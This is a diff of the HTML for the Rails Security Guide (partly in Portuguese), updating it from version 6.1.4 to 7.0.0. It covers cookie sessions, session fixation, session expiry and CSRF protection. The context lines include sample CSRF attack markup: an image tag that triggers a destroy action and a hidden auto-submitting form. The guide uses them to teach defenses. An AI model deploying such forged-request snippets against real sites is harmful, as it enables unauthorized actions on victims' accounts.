@@ -8,7 +8,7 @@
   <link rel="stylesheet" type="text/css" href="stylesheets/print.css" media="print">
   <link rel="stylesheet" type="text/css" href="stylesheets/highlight.css" data-turbolinks-track="reload">
   <link rel="stylesheet" type="text/css" href="stylesheets/search.css" data-turbolinks-track="reload">
-  <link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon" />
+  <link href="images/favicon.ico" rel="icon" type="image/x-icon" />
   <script src="javascripts/turbolinks.js" data-turbolinks-track="reload"></script>
   <script src="javascripts/clipboard.js" data-turbolinks-track="reload"></script>
   <script src="javascripts/guides.js" data-turbolinks-track="reload"></script>
@@ -26,7 +26,7 @@
 </head>
 <body class="guide">
   <div>
-    <div id="version-badge">v6.1.4</div>
+    <div id="version-badge">v7.0.0</div>
   </div>
   <div id="topNav">
     <div class="wrapper">
@@ -93,6 +93,7 @@
                   <dd><a href="active_job_basics.html">Active Job Basics</a></dd>
                   <dd><a href="active_storage_overview.html">Active Storage Overview</a></dd>
                   <dd><a href="action_cable_overview.html">Action Cable Overview</a></dd>
+                  <dd><a href="webpacker.html">Webpacker</a></dd>
                 </div>
                 <div class="guides-section">
                   <dt>Indo mais fundo</dt>
@@ -105,13 +106,14 @@
                   <dd><a href="asset_pipeline.html">The Asset Pipeline</a></dd>
                   <dd><a href="working_with_javascript_in_rails.html">Working with JavaScript in Rails</a></dd>
                   <dd><a href="initialization.html">The Rails Initialization Process</a></dd>
-                  <dd><a href="autoloading_and_reloading_constants.html">Autoloading and Reloading Constants (Zeitwerk Mode)</a></dd>
-                  <dd><a href="autoloading_and_reloading_constants_classic_mode.html">Autoloading and Reloading Constants (Classic Mode)</a></dd>
+                  <dd><a href="autoloading_and_reloading_constants.html">Autoloading and Reloading Constants</a></dd>
+                  <dd><a href="classic_to_zeitwerk_howto.html">Classic para Zeitwerk - Como Fazer</a></dd>
                   <dd><a href="caching_with_rails.html">Caching with Rails: An Overview</a></dd>
                   <dd><a href="active_support_instrumentation.html">Active Support Instrumentation</a></dd>
                   <dd><a href="api_app.html">Using Rails for API-only Applications</a></dd>
                   <dd><a href="active_record_postgresql.html">Active Record and PostgreSQL</a></dd>
                   <dd><a href="active_record_multiple_databases.html">Multiple Databases with Active Record</a></dd>
+                  <dd><a href="active_record_encryption.html">Active Record Encryption</a></dd>
                 </div>
                 <div class="guides-section">
                   <dt>Estendendo o Rails</dt>
@@ -134,6 +136,7 @@
                 <div class="guides-section">
                   <dt>Release Notes</dt>
                   <dd><a href="upgrading_ruby_on_rails.html">Upgrading Ruby on Rails</a></dd>
+                  <dd><a href="7_0_release_notes.html">Version 7.0 - ?</a></dd>
                   <dd><a href="6_1_release_notes.html">Version 6.1 - Dezembro 2020</a></dd>
                   <dd><a href="6_0_release_notes.html">Version 6.0 - Agosto 2019</a></dd>
                   <dd><a href="5_2_release_notes.html">Version 5.2 - April 2018</a></dd>
@@ -190,6 +193,7 @@
                   <option value="active_job_basics.html">Active Job Basics</option>
                   <option value="active_storage_overview.html">Active Storage Overview</option>
                   <option value="action_cable_overview.html">Action Cable Overview</option>
+                  <option value="webpacker.html">Webpacker</option>
               </optgroup>
               <optgroup label="Indo mais fundo">
                   <option value="i18n.html">Rails Internationalization (I18n) API</option>
@@ -201,13 +205,14 @@
                   <option value="asset_pipeline.html">The Asset Pipeline</option>
                   <option value="working_with_javascript_in_rails.html">Working with JavaScript in Rails</option>
                   <option value="initialization.html">The Rails Initialization Process</option>
-                  <option value="autoloading_and_reloading_constants.html">Autoloading and Reloading Constants (Zeitwerk Mode)</option>
-                  <option value="autoloading_and_reloading_constants_classic_mode.html">Autoloading and Reloading Constants (Classic Mode)</option>
+                  <option value="autoloading_and_reloading_constants.html">Autoloading and Reloading Constants</option>
+                  <option value="classic_to_zeitwerk_howto.html">Classic para Zeitwerk - Como Fazer</option>
                   <option value="caching_with_rails.html">Caching with Rails: An Overview</option>
                   <option value="active_support_instrumentation.html">Active Support Instrumentation</option>
                   <option value="api_app.html">Using Rails for API-only Applications</option>
                   <option value="active_record_postgresql.html">Active Record and PostgreSQL</option>
                   <option value="active_record_multiple_databases.html">Multiple Databases with Active Record</option>
+                  <option value="active_record_encryption.html">Active Record Encryption</option>
               </optgroup>
               <optgroup label="Estendendo o Rails">
                   <option value="plugins.html">The Basics of Creating Rails Plugins</option>
@@ -226,6 +231,7 @@
               </optgroup>
               <optgroup label="Release Notes">
                   <option value="upgrading_ruby_on_rails.html">Upgrading Ruby on Rails</option>
+                  <option value="7_0_release_notes.html">Version 7.0 - ?</option>
                   <option value="6_1_release_notes.html">Version 6.1 - Dezembro 2020</option>
                   <option value="6_0_release_notes.html">Version 6.0 - Agosto 2019</option>
                   <option value="5_2_release_notes.html">Version 5.2 - April 2018</option>
@@ -367,22 +373,22 @@ camadas.</li>
 <div class="code_container">
 <pre><code class="highlight ruby"><span class="n">config</span><span class="p">.</span><span class="nf">force_ssl</span> <span class="o">=</span> <span class="kp">true</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-f37cb7b3f06bb56e5157065304e6050f">config.force_ssl = true
+<textarea class="clipboard-content" id="clipboard-52c9c5ffd01da774f6dea391782f3aa2">config.force_ssl = true
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-f37cb7b3f06bb56e5157065304e6050f">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-52c9c5ffd01da774f6dea391782f3aa2">Copiar</button>
 </div>
 </li>
 <li><p>A maioria das pessoas não limpa os <em>cookies</em> depois de trabalhar em um computador público. Portanto, se o último usuário não se desconectou de uma aplicação web, você poderá utilizar a aplicação como se fosse esse usuário.  Forneça ao usuário um <strong>botão para encerrar a sessão</strong> (<em>logout</em>) e <strong>destaque-o</strong>.</p></li>
 <li><p>Muitas das explorações de <a href="https://pt.wikipedia.org/wiki/Cross-site_scripting"><em>cross-site scripting (XSS)</em></a> visam obter o <em>cookie</em> do usuário. Você lerá <a href="#cross-site-scripting-xss">mais sobre XSS</a> mais adiante.</p></li>
 <li><p>Em vez de roubar um <em>cookie</em> que é desconhecido para o invasor, eles corrigem um identificador de sessão de usuário (no <em>cookie</em>) conhecido por eles. Leia mais sobre esse assunto no capítulo chamado Fixação de Sessão mais adiante.</p></li>
 </ul>
-<p>O principal objetivo da maioria dos invasores é ganhar dinheiro. Os preços clandestinos para login de contas bancárias roubadas variam de 0.5%-10% do saldo da conta, $0.5-$30 para números de cartão de crédito ($20-$60 com detalhes completos), $0.1-$1.5 para identidades (nome, SSN - semelhante ao CPF no Brasil - e data de nascimento), $20-$50 para contas de varejistas e $6-$10 para contas de provedor de serviço em nuvem, de acordo com o <a href="https://www.symantec.com/content/dam/symantec/docs/reports/istr-22-2017-en.pdf">Relatório de Ameaças à Segurança na Internet da Symantec (2017, em inglês)</a></p><h4 id="armazenamento-de-sessao"><a class="anchorlink" href="#armazenamento-de-sessao">2.3 Armazenamento de Sessão</a></h4><div class="note"><p>O Rails utiliza o <code>ActionDispatch::Session::CookieStore</code> como armazenamento de sessão padrão.</p></div><div class="info"><p>Saiba mais sobre outros armazenamentos de sessões no <a href="action_controller_overview.html#sessao">Guia do Action Controller Overview</a></p></div><p>O Rails <code>CookieStore</code> salva o <em>hash</em> da sessão em um <em>cookie</em> no lado do
+<p>O principal objetivo da maioria dos invasores é ganhar dinheiro. Os preços clandestinos para login de contas bancárias roubadas variam de 0.5%-10% do saldo da conta, $0.5-$30 para números de cartão de crédito ($20-$60 com detalhes completos), $0.1-$1.5 para identidades (nome, SSN - semelhante ao CPF no Brasil - e data de nascimento), $20-$50 para contas de varejistas e $6-$10 para contas de provedor de serviço em nuvem, de acordo com o <a href="https://docs.broadcom.com/docs/istr-22-2017-en">Relatório de Ameaças à Segurança na Internet da Symantec (2017, em inglês)</a></p><h4 id="armazenamento-de-sessao"><a class="anchorlink" href="#armazenamento-de-sessao">2.3 Armazenamento de Sessão</a></h4><div class="note"><p>O Rails utiliza o <code>ActionDispatch::Session::CookieStore</code> como armazenamento de sessão padrão.</p></div><div class="info"><p>Saiba mais sobre outros armazenamentos de sessões no <a href="action_controller_overview.html#sessao">Guia do Action Controller Overview</a></p></div><p>O Rails <code>CookieStore</code> salva o <em>hash</em> da sessão em um <em>cookie</em> no lado do
 cliente. O servidor recupera o <em>hash</em> da sessão do <em>cookie</em> e elimina a
 necessidade de um ID de sessão. Isso aumentará muito a velocidade da aplicação,
 mas é uma opção de armazenamento controversa e você deve analisar as implicações
 de segurança e limitações de armazenamento dessa opção:</p>
 <ul>
-<li><p>Os <em>cookies</em> têm um limite de tamanho de 4kB. Utilize <em>cookies</em> apenas para dados que são relevantes para a sessão.</p></li>
+<li><p>Os <em>cookies</em> têm um limite de tamanho de 4 kB. Utilize <em>cookies</em> apenas para dados que são relevantes para a sessão.</p></li>
 <li><p>Os <em>cookies</em> são armazenados no lado do cliente. O cliente pode preservar o conteúdo do <em>cookie</em> mesmo se expirados. O cliente pode também copiar os <em>cookies</em> para outras máquinas. Evite armazenar dados sensíveis em <em>cookies</em>.</p></li>
 <li><p>Os <em>cookies</em> são temporários por natureza. O servidor pode definir o tempo de expiração do <em>cookie</em>, mas o cliente pode excluí-lo antes disso. Persista todos os dados de natureza mais permanente do lado do servidor.</p></li>
 <li><p>Os <em>cookies</em> de sessão não se invalidam e podem ser reutilizados de forma
@@ -392,12 +398,12 @@ armazenado.</p></li>
 <li><p>O Rails <a href="https://pt.wikipedia.org/wiki/Encripta%C3%A7%C3%A3o">encripta</a> os <em>cookies</em> por padrão. O cliente não pode ler ou editar o conteúdo de um <em>cookie</em> sem quebrar a criptografia. Se você cuidar adequadamente de suas <em>secrets</em> (segredos, em tradução livre, referente à credenciais de autenticação), poderá considerar que seus <em>cookies</em> são geralmente protegidos.</p></li>
 </ul>
 <p>O <code>CookieStore</code> utiliza um <em>cookie jar</em> (recipiente de <em>cookie</em>)
-<a href="https://api.rubyonrails.org/v6.1.4/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted">encriptado</a>
+<a href="https://api.rubyonrails.org/v7.0.0/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-encrypted">encriptado</a>
 para fornecer um local criptografado seguro para armazenar os dados da sessão.
 As sessões baseadas em <em>cookies</em> fornecem integridade e confidencialidade aos
 seus conteúdos. A chave de encriptação, bem como a chave de verificação
 utilizada para <em>cookies</em>
-<a href="https://api.rubyonrails.org/v6.1.4/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed">assinados</a>,
+<a href="https://api.rubyonrails.org/v7.0.0/classes/ActionDispatch/Cookies/ChainedCookieJars.html#method-i-signed">assinados</a>,
 é derivada do valor de configuração do <code>secret_key_base</code>.</p><div class="info"><p>As <em>secrets</em> devem ser longas e aleatórias. Utilize o comando <code>bin/rails secret</code> para obter novas <em>secrets</em> únicas.</p></div><div class="info"><p>Saiba mais sobre como <a href="security.html#custom-credentials">gerenciar credenciais mais adiante neste guia</a></p></div><p>Também é importante utilizar diferentes valores
 <a href="https://pt.wikipedia.org/wiki/Sal_(criptografia)"><em>salt</em></a> (sal, em tradução
 livre) para <em>cookies</em> encriptados e assinados. Utilizar o mesmo valor para
@@ -406,9 +412,9 @@ derivada seja utilizada para diferentes funcionalidades de segurança que, por
 sua vez, podem enfraquecer a força da chave.</p><p>Em aplicações de teste e desenvolvimento, obtenha uma <code>secret_key_base</code> derivada do nome da aplicação. Outros ambientes devem utilizar uma chave aleatória presente em <code>config/credentials.yml.enc</code>, exibida aqui em seu estado descriptografado:</p><div class="code_container">
 <pre><code class="highlight yaml"><span class="na">secret_key_base</span><span class="pi">:</span> <span class="s">492f...</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-9b0ddacf4cf45e7f4f934d6d2e9f1c8e">secret_key_base: 492f...
+<textarea class="clipboard-content" id="clipboard-2ad75e9f932e9112a8a3e1155f50c4d4">secret_key_base: 492f...
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-9b0ddacf4cf45e7f4f934d6d2e9f1c8e">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-2ad75e9f932e9112a8a3e1155f50c4d4">Copiar</button>
 </div>
 <div class="warning"><p>Se houver a possibilidade das <em>secrets</em> da sua aplicação terem sido expostas, considere alterá-las. Alterar a <code>secret_key_base</code> irá expirar as sessões atualmente ativas.</p></div><h4 id="configuracoes-de-rotacao-de-cookies-assinados-e-encriptados"><a class="anchorlink" href="#configuracoes-de-rotacao-de-cookies-assinados-e-encriptados">2.4 Configurações de Rotação de <em>Cookies</em> Assinados e Encriptados</a></h4><p>A rotação é ideal para alterar as configurações de <em>cookies</em> e garantir que os
 <em>cookies</em> antigos não sejam imediatamente inválidos. Seus usuários têm então a
@@ -421,9 +427,9 @@ atualizar seus <em>cookies</em>.</p><p>É possível rotacionar as <a href="https
 novo valor de configuração:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="no">Rails</span><span class="p">.</span><span class="nf">application</span><span class="p">.</span><span class="nf">config</span><span class="p">.</span><span class="nf">action_dispatch</span><span class="p">.</span><span class="nf">signed_cookie_digest</span> <span class="o">=</span> <span class="s2">"SHA256"</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-db591035ae085a129d061ba44b570a4b">Rails.application.config.action_dispatch.signed_cookie_digest = "SHA256"
+<textarea class="clipboard-content" id="clipboard-2b59081514e77570ad55334e2429ce4d">Rails.application.config.action_dispatch.signed_cookie_digest = "SHA256"
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-db591035ae085a129d061ba44b570a4b">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-2b59081514e77570ad55334e2429ce4d">Copiar</button>
 </div>
 <p>Agora, adicione uma rotação para o antigo <em>digest</em> SHA1 para que os <em>cookies</em>
 existentes sejam perfeitamente atualizados para o novo <em>digest</em> SHA256.</p><div class="code_container">
@@ -431,11 +437,11 @@ existentes sejam perfeitamente atualizados para o novo <em>digest</em> SHA256.</
   <span class="n">cookies</span><span class="p">.</span><span class="nf">rotate</span> <span class="ss">:signed</span><span class="p">,</span> <span class="ss">digest: </span><span class="s2">"SHA1"</span>
 <span class="k">end</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-b520d2b11ba0fd9e8b927180401d7a87">Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
+<textarea class="clipboard-content" id="clipboard-595cd32971c574a46fc9f01f84f8216d">Rails.application.config.action_dispatch.cookies_rotations.tap do |cookies|
   cookies.rotate :signed, digest: "SHA1"
 end
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-b520d2b11ba0fd9e8b927180401d7a87">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-595cd32971c574a46fc9f01f84f8216d">Copiar</button>
 </div>
 <p>Em seguida, quaisquer <em>cookies</em> assinados escritos serão criptografados com
 SHA256. Os <em>cookies</em> antigos que foram gravados com SHA1 ainda podem ser lidos
@@ -444,9 +450,9 @@ atualizados e não serão inválidos quando você remover a rotação.</p><p>Qua
 reescrever seus <em>cookies</em>, remova a rotação.</p><p>Embora você possa configurar quantas rotações desejar, não é muito comum ter
 muitas rotações ao mesmo tempo.</p><p>Para obter mais detalhes sobre a rotação de chaves com mensagens criptografadas
 e assinadas, bem como as várias opções que o método <code>rotate</code> aceita, consulte a
-documentação da <a href="https://api.rubyonrails.org/v6.1.4/classes/ActiveSupport/MessageEncryptor.html">API
+documentação da <a href="https://api.rubyonrails.org/v7.0.0/classes/ActiveSupport/MessageEncryptor.html">API
 MessageEncryptor</a>
-e a <a href="https://api.rubyonrails.org/v6.1.4/classes/ActiveSupport/MessageVerifier.html">API MessageVerifier
+e a <a href="https://api.rubyonrails.org/v7.0.0/classes/ActiveSupport/MessageVerifier.html">API MessageVerifier
 API</a></p><h4 id="replay-attacks-for-cookiestore-sessions"><a class="anchorlink" href="#replay-attacks-for-cookiestore-sessions">2.5 Replay Attacks for CookieStore Sessions</a></h4><div class="info"><p><em>Another sort of attack you have to be aware of when using <code>CookieStore</code> is the replay attack.</em></p></div><p>It works like this:</p>
 <ul>
 <li>A user receives credits, the amount is stored in a session (which is a bad idea anyway, but we'll do this for demonstration purposes).</li>
@@ -467,41 +473,33 @@ API</a></p><h4 id="replay-attacks-for-cookiestore-sessions"><a class="anchorlink
 <h4 id="session-fixation-countermeasures"><a class="anchorlink" href="#session-fixation-countermeasures">2.7 Session Fixation - Countermeasures</a></h4><div class="info"><p><em>One line of code will protect you from session fixation.</em></p></div><p>The most effective countermeasure is to <em>issue a new session identifier</em> and declare the old one invalid after a successful login. That way, an attacker cannot use the fixed session identifier. This is a good countermeasure against session hijacking, as well. Here is how to create a new session in Rails:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="n">reset_session</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-35546abf546a4f61bf9f27f7ac0b4279">reset_session
+<textarea class="clipboard-content" id="clipboard-162a558af522cd6be24dd15fb44f9c0e">reset_session
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-35546abf546a4f61bf9f27f7ac0b4279">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-162a558af522cd6be24dd15fb44f9c0e">Copiar</button>
 </div>
-<p>If you use the popular <a href="https://rubygems.org/gems/devise">Devise</a> gem for user management, it will automatically expire sessions on sign in and sign out for you. If you roll your own, remember to expire the session after your sign in action (when the session is created). This will remove values from the session, therefore <em>you will have to transfer them to the new session</em>.</p><p>Another countermeasure is to <em>save user-specific properties in the session</em>, verify them every time a request comes in, and deny access, if the information does not match. Such properties could be the remote IP address or the user agent (the web browser name), though the latter is less user-specific. When saving the IP address, you have to bear in mind that there are Internet service providers or large organizations that put their users behind proxies. <em>These might change over the course of a session</em>, so these users will not be able to use your application, or only in a limited way.</p><h4 id="session-expiry"><a class="anchorlink" href="#session-expiry">2.8 Session Expiry</a></h4><div class="note"><p><em>Sessions that never expire extend the time-frame for attacks such as cross-site request forgery (CSRF), session hijacking, and session fixation.</em></p></div><p>One possibility is to set the expiry time-stamp of the cookie with the session ID. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to <em>expire sessions in a database table</em>. Call <code>Session.sweep("20 minutes")</code> to expire sessions that were used longer than 20 minutes ago.</p><div class="code_container">
+<p>If you use the popular <a href="https://rubygems.org/gems/devise">Devise</a> gem for user management, it will automatically expire sessions on sign in and sign out for you. If you roll your own, remember to expire the session after your sign in action (when the session is created). This will remove values from the session, therefore <em>you will have to transfer them to the new session</em>.</p><p>Another countermeasure is to <em>save user-specific properties in the session</em>, verify them every time a request comes in, and deny access, if the information does not match. Such properties could be the remote IP address or the user agent (the web browser name), though the latter is less user-specific. When saving the IP address, you have to bear in mind that there are Internet service providers or large organizations that put their users behind proxies. <em>These might change over the course of a session</em>, so these users will not be able to use your application, or only in a limited way.</p><h4 id="session-expiry"><a class="anchorlink" href="#session-expiry">2.8 Session Expiry</a></h4><div class="note"><p><em>Sessions that never expire extend the time-frame for attacks such as cross-site request forgery (CSRF), session hijacking, and session fixation.</em></p></div><p>One possibility is to set the expiry time-stamp of the cookie with the session ID. However the client can edit cookies that are stored in the web browser so expiring sessions on the server is safer. Here is an example of how to <em>expire sessions in a database table</em>. Call <code>Session.sweep(20.minutes)</code> to expire sessions that were used longer than 20 minutes ago.</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="k">class</span> <span class="nc">Session</span> <span class="o">&lt;</span> <span class="no">ApplicationRecord</span>
   <span class="k">def</span> <span class="nc">self</span><span class="o">.</span><span class="nf">sweep</span><span class="p">(</span><span class="n">time</span> <span class="o">=</span> <span class="mi">1</span><span class="p">.</span><span class="nf">hour</span><span class="p">)</span>
-    <span class="k">if</span> <span class="n">time</span><span class="p">.</span><span class="nf">is_a?</span><span class="p">(</span><span class="no">String</span><span class="p">)</span>
-      <span class="n">time</span> <span class="o">=</span> <span class="n">time</span><span class="p">.</span><span class="nf">split</span><span class="p">.</span><span class="nf">inject</span> <span class="p">{</span> <span class="o">|</span><span class="n">count</span><span class="p">,</span> <span class="n">unit</span><span class="o">|</span> <span class="n">count</span><span class="p">.</span><span class="nf">to_i</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">unit</span><span class="p">)</span> <span class="p">}</span>
-    <span class="k">end</span>
-
-    <span class="n">where</span><span class="p">(</span><span class="s2">"updated_at &lt; ?"</span><span class="p">,</span> <span class="n">time</span><span class="p">.</span><span class="nf">ago</span><span class="p">.</span><span class="nf">to_s</span><span class="p">(</span><span class="ss">:db</span><span class="p">)).</span><span class="nf">delete_all</span>
+    <span class="n">where</span><span class="p">(</span><span class="s2">"updated_at &lt; ?"</span><span class="p">,</span> <span class="n">time</span><span class="p">.</span><span class="nf">ago</span><span class="p">.</span><span class="nf">to_formatted_s</span><span class="p">(</span><span class="ss">:db</span><span class="p">)).</span><span class="nf">delete_all</span>
   <span class="k">end</span>
 <span class="k">end</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-1250dab9013b69f0c7b691f40b91da52">class Session &lt; ApplicationRecord
+<textarea class="clipboard-content" id="clipboard-5f8bbc285b9c31f46ffac2f6d535d781">class Session &lt; ApplicationRecord
   def self.sweep(time = 1.hour)
-    if time.is_a?(String)
-      time = time.split.inject { |count, unit| count.to_i.send(unit) }
-    end
-
-    where("updated_at &lt; ?", time.ago.to_s(:db)).delete_all
+    where("updated_at &lt; ?", time.ago.to_formatted_s(:db)).delete_all
   end
 end
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-1250dab9013b69f0c7b691f40b91da52">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-5f8bbc285b9c31f46ffac2f6d535d781">Copiar</button>
 </div>
 <p>The section about session fixation introduced the problem of maintained sessions. An attacker maintaining a session every five minutes can keep the session alive forever, although you are expiring sessions. A simple solution for this would be to add a <code>created_at</code> column to the sessions table. Now you can delete sessions that were created a long time ago. Use this line in the sweep method above:</p><div class="code_container">
-<pre><code class="highlight ruby"><span class="n">where</span><span class="p">(</span><span class="s2">"updated_at &lt; ? OR created_at &lt; ?"</span><span class="p">,</span> <span class="n">time</span><span class="p">.</span><span class="nf">ago</span><span class="p">.</span><span class="nf">to_s</span><span class="p">(</span><span class="ss">:db</span><span class="p">),</span> <span class="mi">2</span><span class="p">.</span><span class="nf">days</span><span class="p">.</span><span class="nf">ago</span><span class="p">.</span><span class="nf">to_s</span><span class="p">(</span><span class="ss">:db</span><span class="p">)).</span><span class="nf">delete_all</span>
+<pre><code class="highlight ruby"><span class="n">where</span><span class="p">(</span><span class="s2">"updated_at &lt; ? OR created_at &lt; ?"</span><span class="p">,</span> <span class="n">time</span><span class="p">.</span><span class="nf">ago</span><span class="p">.</span><span class="nf">to_formatted_s</span><span class="p">(</span><span class="ss">:db</span><span class="p">),</span> <span class="mi">2</span><span class="p">.</span><span class="nf">days</span><span class="p">.</span><span class="nf">ago</span><span class="p">.</span><span class="nf">to_formatted_s</span><span class="p">(</span><span class="ss">:db</span><span class="p">)).</span><span class="nf">delete_all</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-d4b41b2fc2658dcaddaa0c6884c53e60">where("updated_at &lt; ? OR created_at &lt; ?", time.ago.to_s(:db), 2.days.ago.to_s(:db)).delete_all
+<textarea class="clipboard-content" id="clipboard-79e9107fd94138b141a05671ccc15e36">where("updated_at &lt; ? OR created_at &lt; ?", time.ago.to_formatted_s(:db), 2.days.ago.to_formatted_s(:db)).delete_all
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-d4b41b2fc2658dcaddaa0c6884c53e60">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-79e9107fd94138b141a05671ccc15e36">Copiar</button>
 </div>
-<h3 id="cross-site-request-forgery-csrf"><a class="anchorlink" href="#cross-site-request-forgery-csrf">3 Cross-Site Request Forgery (CSRF)</a></h3><p>This attack method works by including malicious code or a link in a page that accesses a web application that the user is believed to have authenticated. If the session for that web application has not timed out, an attacker may execute unauthorized commands.</p><p><img src="images/security/csrf.png" alt=""></p><p>In the <a href="#sessions">session chapter</a> you have learned that most Rails applications use cookie-based sessions. Either they store the session ID in the cookie and have a server-side session hash, or the entire session hash is on the client-side. In either case the browser will automatically send along the cookie on every request to a domain, if it can find a cookie for that domain. The controversial point is that if the request comes from a site of a different domain, it will also send the cookie. Let's start with an example:</p>
+<h3 id="cross-site-request-forgery-csrf"><a class="anchorlink" href="#cross-site-request-forgery-csrf">3 Cross-Site Request Forgery (CSRF)</a></h3><p>This attack method works by including malicious code or a link in a page that accesses a web application that the user is believed to have authenticated. If the session for that web application has not timed out, an attacker may execute unauthorized commands.</p><p><img src="images/security/csrf.png" alt="Cross-Site Request Forgery"></p><p>In the <a href="#sessions">session chapter</a> you have learned that most Rails applications use cookie-based sessions. Either they store the session ID in the cookie and have a server-side session hash, or the entire session hash is on the client-side. In either case the browser will automatically send along the cookie on every request to a domain, if it can find a cookie for that domain. The controversial point is that if the request comes from a site of a different domain, it will also send the cookie. Let's start with an example:</p>
 <ul>
 <li>Bob browses a message board and views a post from a hacker where there is a crafted HTML image element. The element references a command in Bob's project management application, rather than an image file: <code>&lt;img src="http://www.webapp.com/project/1/destroy"&gt;</code>
 </li>
@@ -530,7 +528,7 @@ end
   f.submit();
   return false;"</span><span class="nt">&gt;</span>To the harmless survey<span class="nt">&lt;/a&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-3372fb67ce817809d55d78088592a66a">&lt;a href="http://www.harmless.com/" onclick="
+<textarea class="clipboard-content" id="clipboard-fb9b6a617d9b1af46773fb8d6885a2c4">&lt;a href="http://www.harmless.com/" onclick="
   var f = document.createElement('form');
   f.style.display = 'none';
   this.parentNode.appendChild(f);
@@ -539,21 +537,21 @@ end
   f.submit();
   return false;"&gt;To the harmless survey&lt;/a&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-3372fb67ce817809d55d78088592a66a">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-fb9b6a617d9b1af46773fb8d6885a2c4">Copiar</button>
 </div>
 <p>Or the attacker places the code into the onmouseover event handler of an image:</p><div class="code_container">
 <pre><code class="highlight html"><span class="nt">&lt;img</span> <span class="na">src=</span><span class="s">"http://www.harmless.com/img"</span> <span class="na">width=</span><span class="s">"400"</span> <span class="na">height=</span><span class="s">"400"</span> <span class="na">onmouseover=</span><span class="s">"..."</span> <span class="nt">/&gt;</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-927e088b630f975cfccbb79956b0a3f5">&lt;img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." /&gt;
+<textarea class="clipboard-content" id="clipboard-989021fa3f458f4b50eeed5399120f10">&lt;img src="http://www.harmless.com/img" width="400" height="400" onmouseover="..." /&gt;
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-927e088b630f975cfccbb79956b0a3f5">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-989021fa3f458f4b50eeed5399120f10">Copiar</button>
 </div>
 <p>There are many other possibilities, like using a <code>&lt;script&gt;</code> tag to make a cross-site request to a URL with a JSONP or JavaScript response. The response is executable code that the attacker can find a way to run, possibly extracting sensitive data. To protect against this data leakage, we must disallow cross-site <code>&lt;script&gt;</code> tags. Ajax requests, however, obey the browser's same-origin policy (only your own site is allowed to initiate <code>XmlHttpRequest</code>) so we can safely allow them to return JavaScript responses.</p><div class="note"><p>We can't distinguish a <code>&lt;script&gt;</code> tag's origin—whether it's a tag on your own site or on some other malicious site—so we must block all <code>&lt;script&gt;</code> across the board, even if it's actually a safe same-origin script served from your own site. In these cases, explicitly skip CSRF protection on actions that serve JavaScript meant for a <code>&lt;script&gt;</code> tag.</p></div><p>To protect against all other forged requests, we introduce a <em>required security token</em> that our site knows but other sites don't know. We include the security token in requests and verify it on the server. This is done automatically when <code>config.action_controller.default_protect_from_forgery</code> is set to <code>true</code>, which is the default for newly created Rails applications. You can also do it manually by adding the following to your application controller:</p><div class="code_container">
 <pre><code class="highlight ruby"><span class="n">protect_from_forgery</span> <span class="ss">with: :exception</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-6c9bfa509947aecb870037ebff085694">protect_from_forgery with: :exception
+<textarea class="clipboard-content" id="clipboard-5bf68e4d3e6d05bf625ecf60186ba28f">protect_from_forgery with: :exception
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-6c9bfa509947aecb870037ebff085694">Copiar</button>
+<button class="clipboard-button" data-clipboard-target="#clipboard-5bf68e4d3e6d05bf625ecf60186ba28f">Copiar</button>
 </div>
 <p>This will include a security token in all forms and Ajax requests generated by Rails. If the security token doesn't match what was expected, an exception will be thrown.</p><div class="note"><p>By default, Rails includes an <a href="https://github.com/rails/rails/blob/main/actionview/app/assets/javascripts">unobtrusive scripting adapter</a>,
 which adds a header called <code>X-CSRF-Token</code> with the security token on every non-GET
@@ -566,31 +564,31 @@ a look at <code>&lt;meta name='csrf-token' content='THE-TOKEN'&gt;</code> tag pr
   <span class="n">sign_out_user</span> <span class="c1"># Example method that will destroy the user cookies</span>
 <span class="k">end</span>
 </code></pre>
-<textarea class="clipboard-content" id="clipboard-49d647adc40c8bccff2b77961f27c1e8">rescue_from ActionController::InvalidAuthenticityToken do |exception|
+<textarea class="clipboard-content" id="clipboard-5536471b20cab0c77247fb2dd00a68cf">rescue_from ActionController::InvalidAuthenticityToken do |exception|
   sign_out_user # Example method that will destroy the user cookies
 end
 </textarea>
-<button class="clipboard-button" data-clipboard-target="#clipboard-49d647adc40c8bccff2b77961f27c1e8">Copiar</button>
